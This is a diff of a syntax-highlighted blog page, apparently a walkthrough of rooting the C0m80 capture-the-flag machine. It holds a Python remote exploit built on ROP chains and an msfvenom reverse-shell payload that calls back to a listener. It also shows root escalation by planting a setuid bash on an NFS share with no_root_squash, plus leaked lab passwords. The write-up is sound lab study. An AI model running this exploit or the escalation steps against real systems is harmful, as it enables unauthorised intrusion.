 <span class="k">def</span> <span class="nf">boundint</span> <span class="p">(</span><span class="n">val</span><span class="p">,</span> <span class="n">nbits</span><span class="p">):</span>
     <span class="k">return</span> <span class="p">((</span><span class="n">val</span> <span class="o">+</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">nbits</span><span class="p">))</span> <span class="o">%</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">nbits</span><span class="p">))</span>
@@ -1793,7 +1789,7 @@ Don’t forget to change the used shellcode with yours, otherwise it just won’
 '''</span>
 
 <span class="k">def</span> <span class="nf">pack_rop</span> <span class="p">(</span><span class="n">ropchain</span><span class="p">):</span>
-    <span class="k">return</span> <span class="s">''</span><span class="o">.</span><span class="n">join</span> <span class="p">([</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span> <span class="k">for</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">ropchain</span> <span class="p">])</span>
+    <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span> <span class="p">([</span><span class="n">struct</span><span class="p">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span> <span class="k">for</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">ropchain</span> <span class="p">])</span>
 
 <span class="k">def</span> <span class="nf">patch_once</span> <span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
     <span class="n">ropchain</span> <span class="o">=</span> <span class="p">[</span>
@@ -1825,19 +1821,19 @@ Don’t forget to change the used shellcode with yours, otherwise it just won’
     <span class="c1">#print 'padded   len (data) : %d' % len (data)
 </span>
     <span class="k">for</span> <span class="n">idx</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span> <span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="n">align</span><span class="p">):</span>
-        <span class="n">value</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="n">idx</span> <span class="p">:</span> <span class="n">idx</span><span class="o">+</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="n">value</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="n">idx</span> <span class="p">:</span> <span class="n">idx</span><span class="o">+</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
         <span class="c1">#print 'Writing "%s" at 0x%x' % (data[idx : idx+4], addr + idx)
 </span>        <span class="n">payload</span> <span class="o">=</span> <span class="n">patch_once</span> <span class="p">(</span><span class="n">addr</span> <span class="o">+</span> <span class="n">idx</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
 
         <span class="k">if</span> <span class="n">verbose</span><span class="p">:</span>
-            <span class="k">print</span> <span class="s">'packed : </span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">payload</span><span class="o">.</span><span class="n">encode</span> <span class="p">(</span><span class="s">'hex'</span><span class="p">)</span>
+            <span class="k">print</span> <span class="s">'packed : %s'</span> <span class="o">%</span> <span class="n">payload</span><span class="p">.</span><span class="n">encode</span> <span class="p">(</span><span class="s">'hex'</span><span class="p">)</span>
             <span class="k">if</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span> <span class="ow">in</span> <span class="n">payload</span> <span class="ow">or</span> <span class="s">'</span><span class="se">\x0a</span><span class="s">'</span> <span class="ow">in</span> <span class="n">payload</span> <span class="ow">in</span> <span class="s">'</span><span class="se">\x0d</span><span class="s">'</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
-                <span class="k">print</span> <span class="s">'[-] There is a NULL for addr = 0x</span><span class="si">%08</span><span class="s">x , value = 0x</span><span class="si">%08</span><span class="s">x'</span> <span class="o">%</span> <span class="p">(</span><span class="n">addr</span> <span class="o">+</span> <span class="n">idx</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
+                <span class="k">print</span> <span class="s">'[-] There is a NULL for addr = 0x%08x , value = 0x%08x'</span> <span class="o">%</span> <span class="p">(</span><span class="n">addr</span> <span class="o">+</span> <span class="n">idx</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
 
         <span class="n">target</span> <span class="o">=</span> <span class="n">remote</span> <span class="p">(</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">target_port</span><span class="p">)</span>
         <span class="n">do_overflow</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">sebp</span><span class="p">)</span>
         <span class="n">sleep</span> <span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
-        <span class="n">target</span><span class="o">.</span><span class="n">close</span> <span class="p">()</span>
+        <span class="n">target</span><span class="p">.</span><span class="n">close</span> <span class="p">()</span>
 
 <span class="c1"># write command
 </span><span class="n">cmd</span> <span class="o">=</span> <span class="s">'rundll32 Z:</span><span class="se">\\</span><span class="s">ftpsvr</span><span class="se">\\</span><span class="s">bkp</span><span class="se">\\</span><span class="s">shell.dll'</span>
@@ -1877,25 +1873,25 @@ Don’t forget to change the used shellcode with yours, otherwise it just won’
 <span class="c1"># write func_system
 </span><span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_VirtualAlloc</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
 <span class="c1"># fix addr
-</span><span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_VirtualAlloc</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">has_modif</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x615f6f47</span><span class="p">))</span>
-<span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_VirtualAlloc</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">has_modif</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x615f6f47</span><span class="p">))</span>
+</span><span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_VirtualAlloc</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">has_modif</span><span class="p">,</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x615f6f47</span><span class="p">))</span>
+<span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_VirtualAlloc</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">has_modif</span><span class="p">,</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x615f6f47</span><span class="p">))</span>
 <span class="c1"># fix size
-</span><span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_VirtualAlloc</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">+</span> <span class="n">has_modif</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x40554469</span><span class="p">))</span>
-<span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_VirtualAlloc</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">+</span> <span class="n">has_modif</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x40554469</span><span class="p">))</span>
+</span><span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_VirtualAlloc</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">+</span> <span class="n">has_modif</span><span class="p">,</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x40554469</span><span class="p">))</span>
+<span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_VirtualAlloc</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">+</span> <span class="n">has_modif</span><span class="p">,</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x40554469</span><span class="p">))</span>
 <span class="c1"># fix alloc type
-</span><span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_VirtualAlloc</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">+</span> <span class="n">has_modif</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x54407d60</span><span class="p">))</span>
-<span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_VirtualAlloc</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">+</span> <span class="n">has_modif</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x54407d60</span><span class="p">))</span>
+</span><span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_VirtualAlloc</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">+</span> <span class="n">has_modif</span><span class="p">,</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x54407d60</span><span class="p">))</span>
+<span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_VirtualAlloc</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">+</span> <span class="n">has_modif</span><span class="p">,</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x54407d60</span><span class="p">))</span>
 <span class="c1"># fix protect
-</span><span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_VirtualAlloc</span> <span class="o">+</span> <span class="mi">20</span> <span class="o">+</span> <span class="n">has_modif</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x596f4b7d</span><span class="p">))</span>
-<span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_VirtualAlloc</span> <span class="o">+</span> <span class="mi">20</span> <span class="o">+</span> <span class="n">has_modif</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x596f4b7d</span><span class="p">))</span>
+</span><span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_VirtualAlloc</span> <span class="o">+</span> <span class="mi">20</span> <span class="o">+</span> <span class="n">has_modif</span><span class="p">,</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x596f4b7d</span><span class="p">))</span>
+<span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_VirtualAlloc</span> <span class="o">+</span> <span class="mi">20</span> <span class="o">+</span> <span class="n">has_modif</span><span class="p">,</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x596f4b7d</span><span class="p">))</span>
 
 <span class="c1"># pivot to VirtualAlloc()
 </span><span class="n">target</span> <span class="o">=</span> <span class="n">remote</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">)</span>
-<span class="n">do_overflow</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">addr_leave</span><span class="p">),</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">addr_rop_VirtualAlloc</span> <span class="o">-</span> <span class="mi">4</span><span class="p">))</span>
+<span class="n">do_overflow</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">addr_leave</span><span class="p">),</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">addr_rop_VirtualAlloc</span> <span class="o">-</span> <span class="mi">4</span><span class="p">))</span>
 
 <span class="c1"># system (cmd)
-</span><span class="k">print</span> <span class="s">'[+] cmd : 0x</span><span class="si">%08</span><span class="s">x'</span> <span class="o">%</span> <span class="n">start_data</span>
-<span class="k">print</span> <span class="s">'[+] sys : 0x</span><span class="si">%08</span><span class="s">x'</span> <span class="o">%</span> <span class="n">addr_rop_system</span>
+</span><span class="k">print</span> <span class="s">'[+] cmd : 0x%08x'</span> <span class="o">%</span> <span class="n">start_data</span>
+<span class="k">print</span> <span class="s">'[+] sys : 0x%08x'</span> <span class="o">%</span> <span class="n">addr_rop_system</span>
 
 <span class="c1"># write system
 </span><span class="n">ropchain</span> <span class="o">=</span> <span class="p">[</span>
@@ -1915,19 +1911,19 @@ Don’t forget to change the used shellcode with yours, otherwise it just won’
 
 <span class="c1"># write func_system
 </span><span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_system</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
-<span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_system</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x5760726b</span><span class="p">))</span>
-<span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_system</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x5760726b</span><span class="p">))</span>
+<span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_system</span><span class="p">,</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x5760726b</span><span class="p">))</span>
+<span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_system</span><span class="p">,</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x5760726b</span><span class="p">))</span>
 
 <span class="c1"># write cmd addr
-</span><span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_system</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x4f7e7f78</span><span class="p">))</span>
-<span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_system</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x4f7e7f78</span><span class="p">))</span>
+</span><span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_system</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x4f7e7f78</span><span class="p">))</span>
+<span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_system</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x4f7e7f78</span><span class="p">))</span>
 
 <span class="c1"># pivot and execute system()
 </span><span class="n">target</span> <span class="o">=</span> <span class="n">remote</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">)</span>
-<span class="n">do_overflow</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">addr_leave</span><span class="p">),</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">addr_rop_system</span> <span class="o">-</span> <span class="mi">4</span><span class="p">))</span>
-<span class="n">target</span><span class="o">.</span><span class="n">close</span> <span class="p">()</span>
+<span class="n">do_overflow</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">addr_leave</span><span class="p">),</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">addr_rop_system</span> <span class="o">-</span> <span class="mi">4</span><span class="p">))</span>
+<span class="n">target</span><span class="p">.</span><span class="n">close</span> <span class="p">()</span>
 
-<span class="k">print</span> <span class="s">'addrof (shellcode) = 0x</span><span class="si">%08</span><span class="s">x'</span> <span class="o">%</span> <span class="n">addr_shellcode</span>
+<span class="k">print</span> <span class="s">'addrof (shellcode) = 0x%08x'</span> <span class="o">%</span> <span class="n">addr_shellcode</span>
 
 <span class="c1"># msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.102 LPORT=4444 -f python -b '\x00\x0a'
 </span><span class="n">buf</span> <span class="o">=</span>  <span class="s">""</span>
@@ -1941,7 +1937,7 @@ Don’t forget to change the used shellcode with yours, otherwise it just won’
 <span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xc2\x78\x55\xea</span><span class="s">"</span>
 <span class="n">shellcode</span> <span class="o">=</span> <span class="n">buf</span>
 
-<span class="k">print</span> <span class="s">'sizeof shellcode : </span><span class="si">%</span><span class="s">d'</span> <span class="o">%</span> <span class="nb">len</span> <span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+<span class="k">print</span> <span class="s">'sizeof shellcode : %d'</span> <span class="o">%</span> <span class="nb">len</span> <span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
 
 <span class="c1"># pivot and execute shellcode
 </span><span class="n">payload</span> <span class="o">=</span> <span class="s">'</span><span class="se">\x90</span><span class="s">'</span> <span class="o">*</span> <span class="mi">10</span> <span class="o">+</span> <span class="n">shellcode</span>
@@ -1949,8 +1945,9 @@ Don’t forget to change the used shellcode with yours, otherwise it just won’
 
 <span class="c1"># trigger exec
 </span><span class="n">target</span> <span class="o">=</span> <span class="n">remote</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">)</span>
-<span class="n">do_overflow</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">addr_shellcode</span> <span class="o">+</span> <span class="mi">10</span><span class="p">),</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">addr_shellcode</span> <span class="o">+</span> <span class="mh">0x500</span> <span class="o">-</span> <span class="mi">4</span><span class="p">))</span>
-<span class="n">target</span><span class="o">.</span><span class="n">close</span> <span class="p">()</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="n">do_overflow</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">addr_shellcode</span> <span class="o">+</span> <span class="mi">10</span><span class="p">),</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">addr_shellcode</span> <span class="o">+</span> <span class="mh">0x500</span> <span class="o">-</span> <span class="mi">4</span><span class="p">))</span>
+<span class="n">target</span><span class="p">.</span><span class="n">close</span> <span class="p">()</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <h1 id="post-exploitation--privilege-escalation">Post-Exploitation : Privilege Escalation</h1>
 
@@ -2113,7 +2110,8 @@ cat /etc/exports
 # /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
 # /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
 #
-/ftpsvr/bkp           *(rw,sync,no_root_squash,no_subtree_check)</pre></td></tr></tbody></table></code></pre></figure>
+/ftpsvr/bkp           *(rw,sync,no_root_squash,no_subtree_check)
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>We got our way to escalate our privileges!
 no_root_squash is a big no no for NFS configuration.
@@ -2125,7 +2123,8 @@ that misconfigured share.</p>
 3
 </pre></td><td class="code"><pre> no_root_squash - Allows root users on client computers to have root
 access on the server. Mount requests for root are not be mounted to
-the anonomous user. This option is needed for diskless clients.</pre></td></tr></tbody></table></code></pre></figure>
+the anonomous user. This option is needed for diskless clients.
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Looking at the folder, we get to see that the bkp folder is only readable by
 members of the ‘backup’ group. Reading /etc/passwd yield al1ce as being a
@@ -2174,7 +2173,8 @@ I'm using my new password manager
 
    WELL DONE &amp; KEEP IT UP ;D
 
-#################################</pre></td></tr></tbody></table></code></pre></figure>
+#################################
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>I went looking for that password manager and ended up finding a page:
 /home/b0b/.wine/drive_c/users/b0b/Application Data/Mozilla/Extensions/PWMangr2.html</p>
@@ -2198,7 +2198,8 @@ public key.</p>
 To reach it from outside, we can use ncat as a port forwarder.</p>
 
 <figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
-</pre></td><td class="code"><pre>b0b@C0m80:~$ ncat --sh-exec "ncat ::1 65122" -l 10022 --keep-open</pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre>b0b@C0m80:~$ ncat --sh-exec "ncat ::1 65122" -l 10022 --keep-open
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>SSH in al1ce account using the exfiltrated bob’s private key
 and the key password (7M6Kt8tC8X5Qz99@Eeb8592Z$Fd@u286).</p>
@@ -2218,7 +2219,8 @@ al1ce@C0m80:~$ ls -lash /ftpsvr/bkp/
 total 2.7M
 4.0K drwxrwx--- 2 root   backup 4.0K Sep 23 02:37 .
 4.0K drwxr-xr-x 3 b0b    b0b    4.0K Sep 23 01:07 ..
-2.7M -rw-r--r-- 1 backup backup 2.7M Oct 11 17:20 ftp104.bkp</pre></td></tr></tbody></table></code></pre></figure>
+2.7M -rw-r--r-- 1 backup backup 2.7M Oct 11 17:20 ftp104.bkp
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Using our NFS access, we upload a root setuid binary.</p>
 
@@ -2239,7 +2241,8 @@ root@kali:~/c0m80# ls -lash bkp/bash
 root@kali:~/c0m80# chmod +s bkp/bash 
 root@kali:~/c0m80# ls -lash bkp/bash
 964K -rwsr-sr-x 1 root root 964K Oct 11  2017 bkp/bash
-root@kali:~/c0m80# umount bkp</pre></td></tr></tbody></table></code></pre></figure>
+root@kali:~/c0m80# umount bkp
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Now with al1ce account:</p>
 
@@ -2306,7 +2309,8 @@ All the best.
 
    K1ll3rC0m80D3@l7&amp;i5mash3dth1580x
 
-######################################</pre></td></tr></tbody></table></code></pre></figure>
+######################################
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>And that’s it for that VM, we rooted it, we’re god on it.</p>
 
@@ -2430,6 +2434,26 @@ All the best.
   </div>
 
 </footer>
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({
+          google_ad_client: "ca-pub-9302170278788846",
+          enable_page_level_ads: true
+     });
+</script>
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-16686496-2');
+</script>
+
 
 
   </body>
